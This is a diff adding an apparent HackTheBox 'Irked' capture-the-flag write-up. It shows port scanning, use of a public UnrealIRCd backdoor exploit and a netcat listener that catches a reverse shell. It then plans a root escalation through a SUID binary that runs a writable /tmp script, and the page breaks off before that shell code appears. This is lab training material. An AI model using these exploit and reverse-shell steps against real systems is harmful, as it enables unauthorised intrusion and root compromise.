@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Irked</strong></h1>
+        <em>Released: 17th November 2018 / Pwned: 29th October 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Irked has you attacking UnrealIRC, a widespread IRC daemon with a devastating command execution vulnerability. Once on the system, you exploit a SUID binary to get root.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Exploits/Scripts/Unique Tools used</strong></h4>
+        • HexChat<br>
+        • <a href="https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor">https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor</a><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.117</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p 22,80,111,6697,8067,40573,65534 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.117</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.117</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+                111<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind<br>
+                6697<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;ircs<span style="color:#ffdd00;font-weight:400">-u</span><br>
+                8067<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;infi-async<br>
+                40573<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;unknown<br>
+                65534<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;unknown<br>
+                <br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;22,80,111,6697,8067,40573,65534&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.117</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;6.7p1&nbsp;Debian&nbsp;5+deb8u4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;1024&nbsp;6a<span style="color:#ff9d00;font-weight:700">:</span>5d<span style="color:#ff9d00;font-weight:700">:</span>f5<span style="color:#ff9d00;font-weight:700">:</span>bd<span style="color:#ff9d00;font-weight:700">:</span>cf<span style="color:#ff9d00;font-weight:700">:</span>83<span style="color:#ff9d00;font-weight:700">:</span>78<span style="color:#ff9d00;font-weight:700">:</span>b6<span style="color:#ff9d00;font-weight:700">:</span>75<span style="color:#ff9d00;font-weight:700">:</span>31<span style="color:#ff9d00;font-weight:700">:</span>9b<span style="color:#ff9d00;font-weight:700">:</span>dc<span style="color:#ff9d00;font-weight:700">:</span>79<span style="color:#ff9d00;font-weight:700">:</span>c5<span style="color:#ff9d00;font-weight:700">:</span>fd<span style="color:#ff9d00;font-weight:700">:</span>ad&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>DSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;75<span style="color:#ff9d00;font-weight:700">:</span>2e<span style="color:#ff9d00;font-weight:700">:</span>66<span style="color:#ff9d00;font-weight:700">:</span>bf<span style="color:#ff9d00;font-weight:700">:</span>b9<span style="color:#ff9d00;font-weight:700">:</span>3c<span style="color:#ff9d00;font-weight:700">:cc:</span>f7<span style="color:#ff9d00;font-weight:700">:</span>7e<span style="color:#ff9d00;font-weight:700">:</span>84<span style="color:#ff9d00;font-weight:700">:</span>8a<span style="color:#ff9d00;font-weight:700">:</span>8b<span style="color:#ff9d00;font-weight:700">:</span>f0<span style="color:#ff9d00;font-weight:700">:</span>81<span style="color:#ff9d00;font-weight:700">:</span>02<span style="color:#ff9d00;font-weight:700">:</span>33&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;c8<span style="color:#ff9d00;font-weight:700">:</span>a3<span style="color:#ff9d00;font-weight:700">:</span>a2<span style="color:#ff9d00;font-weight:700">:</span>5e<span style="color:#ff9d00;font-weight:700">:</span>34<span style="color:#ff9d00;font-weight:700">:</span>9a<span style="color:#ff9d00;font-weight:700">:</span>c4<span style="color:#ff9d00;font-weight:700">:</span>9b<span style="color:#ff9d00;font-weight:700">:</span>90<span style="color:#ff9d00;font-weight:700">:</span>53<span style="color:#ff9d00;font-weight:700">:</span>f7<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>bf<span style="color:#ff9d00;font-weight:700">:</span>ea<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>3b&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;8d<span style="color:#ff9d00;font-weight:700">:</span>1b<span style="color:#ff9d00;font-weight:700">:</span>43<span style="color:#ff9d00;font-weight:700">:</span>c7<span style="color:#ff9d00;font-weight:700">:</span>d0<span style="color:#ff9d00;font-weight:700">:</span>1a<span style="color:#ff9d00;font-weight:700">:</span>4c<span style="color:#ff9d00;font-weight:700">:</span>05<span style="color:#ff9d00;font-weight:700">:</span>cf<span style="color:#ff9d00;font-weight:700">:</span>82<span style="color:#ff9d00;font-weight:700">:</span>ed<span style="color:#ff9d00;font-weight:700">:</span>c1<span style="color:#ff9d00;font-weight:700">:</span>01<span style="color:#ff9d00;font-weight:700">:</span>63<span style="color:#ff9d00;font-weight:700">:</span>a2<span style="color:#ff9d00;font-weight:700">:</span>0c&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.10&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Debian<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.10&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Debian<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>text<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                111<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind&nbsp;2-4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RPC&nbsp;<span style="color:#0088ff;font-weight:400">#100000)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;rpcinfo<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;program&nbsp;version&nbsp;&nbsp;&nbsp;&nbsp;port<span style="color:#ff9d00;font-weight:700">/</span>proto&nbsp;&nbsp;service<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;rpcbind<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111<span style="color:#ff9d00;font-weight:700">/</span>udp&nbsp;&nbsp;&nbsp;rpcbind<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111<span style="color:#ff9d00;font-weight:700">/</span>tcp6&nbsp;&nbsp;rpcbind<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111<span style="color:#ff9d00;font-weight:700">/</span>udp6&nbsp;&nbsp;rpcbind<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;40573<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;status<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;46622<span style="color:#ff9d00;font-weight:700">/</span>tcp6&nbsp;&nbsp;status<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;51941<span style="color:#ff9d00;font-weight:700">/</span>udp6&nbsp;&nbsp;status<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;56607<span style="color:#ff9d00;font-weight:700">/</span>udp&nbsp;&nbsp;&nbsp;status<br>
+                6697<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;irc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UnrealIRCd<br>
+                8067<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;irc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UnrealIRCd<br>
+                40573<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;status&nbsp;&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RPC&nbsp;<span style="color:#0088ff;font-weight:400">#100024)</span><br>
+                65534<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;irc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UnrealIRCd<br>
+                Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Aggressive&nbsp;OS&nbsp;guesses<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Linux&nbsp;3.12&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>95%<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Analysis:<br>
+        • <code>22/ssh</code> - Useful to know for later. Also note that 6.7p1 is an old version of OpenSSH<br>
+        • <code>80/http</code> - Nothing here, apart from a mention of IRC. Note that Apache 2.4.10 is old. We're targeting an old system here.<br>
+        • <code>6697/UnrealIRCd</code> - An IRC client! It's running on a non-standard port (I think). The standard IRC port is 6667.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 6697 - UnrealIRCd</strong></h2><br>
+        I wanted to find what version of UnrealIRCd was running, so I connected to the IRC on Irked with HexChat.<br>
+        <br>
+        Open HexChat.<br>
+        Add a new Network.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Configure the IP and port to that of your target - <code>10.10.10.117/6697</code>.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Click Close and click Connect.<br>
+        Upon connection, you'll see the running version - <code>Unreal3.2.8.1</code>.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <code>searchsploit</code> for some exploits.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#searchsploit&nbsp;unrealirc</span><br>
+                --------------------------------------------------------------------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                --------------------------------------------------------------------------------------------------<br>
+                UnrealIRCd&nbsp;3.2.8.1&nbsp;-&nbsp;Backdoor&nbsp;Command&nbsp;Execution<span style="color:#ff9d00;font-weight:700">(</span>Metasploit<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>16922.rb<br>
+                UnrealIRCd&nbsp;3.2.8.1&nbsp;-&nbsp;Local&nbsp;Configuration&nbsp;Stack&nbsp;Overflow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>dos<span style="color:#ff9d00;font-weight:700">/</span>18011.txt<br>
+                UnrealIRCd&nbsp;3.2.8.1&nbsp;-&nbsp;Remote&nbsp;Downloader<span style="color:#ff9d00;font-weight:700">/</span>Execute&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>13853.pl<br>
+                UnrealIRCd&nbsp;3.x&nbsp;-&nbsp;Remote&nbsp;Denial&nbsp;of&nbsp;Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>dos<span style="color:#ff9d00;font-weight:700">/</span>27407.pl<br>
+                --------------------------------------------------------------------------------------------------<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        The DoS attacks I'm not interested in, and I wanted to avoid using metasploit.<br>
+        The best option was the Remote Downloaded/Execute exploit then - <a href="https://www.exploit-db.com/exploits/13853.">https://www.exploit-db.com/exploits/13853.</a><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 13853.pl is Broken</strong></h2><br>
+        The exploit code for <code>https://www.exploit-db.com/exploits/13853</code> needs tweaking:<br>
+        • The (now broken) URLs need substituting with commands<br>
+        ◇ <code>my $payload1</code> - can generate a unix bind shell with msfvenom<br>
+        ◇ <code>my $payload2</code> - can generate a perl reverse shell with msfvenom<br>
+        • The payload numbers are wrong<br>
+        ◇ Payloads 2 and 3 are swapped<br>
+        ◇ <code>my $payload2</code> is clearly a bot, but the help output says that option 2 is a reverse shell<br>
+        ◇ <code>my $payload3</code> is clearly a reverse shell, but the help output says that option 3 is a bot<br>
+        <br>
+        Despite modifications, I couldn't get this exploit to work.<br>
+        Reading other exploit scripts, I think the payload might need to be base64 encoded before it's submitted.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Metasploit or Google</strong></h2><br>
+        Alternatively, then, you could use metasploit to exploit UnrealIRC, or find another script.<br>
+        <br>
+        I consulted google and found another exploit script - <a href="https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.">https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.</a><br>
+        Many thanks to <em>Ranger11Danger</em>, all credit goes to them.<br>
+        <br>
+        Download <em>Ranger11Danger</em>'s script.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked<span style="color:#ff9d00;font-weight:700">/</span>unrealirc]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wget&nbsp;-q&nbsp;https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked<span style="color:#ff9d00;font-weight:700">/</span>unrealirc]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mv&nbsp;exploit.py&nbsp;unrealpwn.py</span>
+            </div>
+        </div><br>
+        <br>
+        Modify the IP and port the script's reverse shells will connect back to.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked<span style="color:#ff9d00;font-weight:700">/</span>unrealirc]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;unrealpwn.py</span><br>
+                [...]<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Sets&nbsp;the&nbsp;local&nbsp;ip&nbsp;and&nbsp;port&nbsp;(address&nbsp;and&nbsp;port&nbsp;to&nbsp;listen&nbsp;on)</span><br>
+                local_ip&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.14.12'</span>&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;CHANGE&nbsp;THIS</span><br>
+                local_port&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'9001'</span>&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;CHANGE&nbsp;THIS&nbsp;</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your chosen port.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked<span style="color:#ff9d00;font-weight:700">/</span>unrealirc]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9001</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run the exploit script! I used the python payload.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked<span style="color:#ff9d00;font-weight:700">/</span>unrealirc]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python3&nbsp;unrealpwn.py&nbsp;10.10.10.117&nbsp;6697&nbsp;-payload&nbsp;python</span><br>
+                Exploit&nbsp;sent&nbsp;successfully<span style="color:#ff9d00;font-weight:700">!</span>
+            </div>
+        </div><br>
+        <br>
+        You should see a reverse shell from <code>ircd</code> on your listener.<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.117]&nbsp;37854<br>
+                ircd@irked<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>Unreal3.2$&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=1001<span style="color:#ff9d00;font-weight:700">(</span>ircd<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1001<span style="color:#ff9d00;font-weight:700">(</span>ircd<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1001<span style="color:#ff9d00;font-weight:700">(</span>ircd<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to root</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) viewuser</strong></h2><br>
+        <code>lse.sh</code> is a brilliant system info gathering tool - <a href="https://github.com/diego-treitos/linux-smart-enumeration.">https://github.com/diego-treitos/linux-smart-enumeration</a>.<br>
+        <br>
+        Check for SUID binaries on the system.<br>
+            <div class="codebox">
+                ircd@irked<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-perm&nbsp;-u=s&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                [...]<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>viewuser<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>mount.nfs<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/su</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/mount</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>fusermount<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>ntfs-3g<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/umount</span>
+            </div>
+        </div><br>
+        <br>
+        <code>viewuser</code> is an unusual SUID binary.<br>
+        It's owned by root and has a SUID bit on it, which means that <code>viewuser</code> will run as root.<br>
+            <div class="codebox">
+                ircd@irked<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>viewuser<br>
+                -rwsr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;7328&nbsp;May&nbsp;16&nbsp;&nbsp;2018&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>viewuser
+            </div>
+        </div><br>
+        <br>
+        Run <code>viewuser</code>, you'll see that it tries to execute a shell script - <code>/tmp/listusers</code>, which doens't exist.<br>
+            <div class="codebox">
+                ircd@irked<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;viewuser&nbsp;-h<br>
+                This&nbsp;application&nbsp;is&nbsp;being&nbsp;devleoped&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;and&nbsp;<span style="color:#ff9d00;font-weight:700">test</span>&nbsp;user&nbsp;permissions<br>
+                It&nbsp;is&nbsp;still&nbsp;being&nbsp;actively&nbsp;developed<br>
+                <span style="color:#ff9d00;font-weight:700">(</span>unknown<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2019-10-29&nbsp;04<span style="color:#ff9d00;font-weight:700">:</span>54&nbsp;<span style="color:#ff9d00;font-weight:700">(:</span>0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">sh:</span>&nbsp;1<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>listusers<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;not&nbsp;found
+            </div>
+        </div><br>
+        <br>
+        Because <code>viewuser</code> runs as root, it will execute <code>/tmp/listusers</code> as root.<br>
+        <code>/tmp/listusers</code> doesn't exist.<br>
+        This means we can create our own <code>/tmp/listusers</code> file and write a reverse shell in it.<br>
+        <br>
+        When <code>viewuser</code> runs <code>/tmp/listusers</code>, we'll be sent a reverse shell by root.<br>
+        <br>
+        Start a listener on your attacking machien to receive the reverse shell<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>irked]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9002</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Write a netcat reverse shell into <code>/tmp/listusers</code> and make it executable by everyone.<br>
+            <div class="codebox">
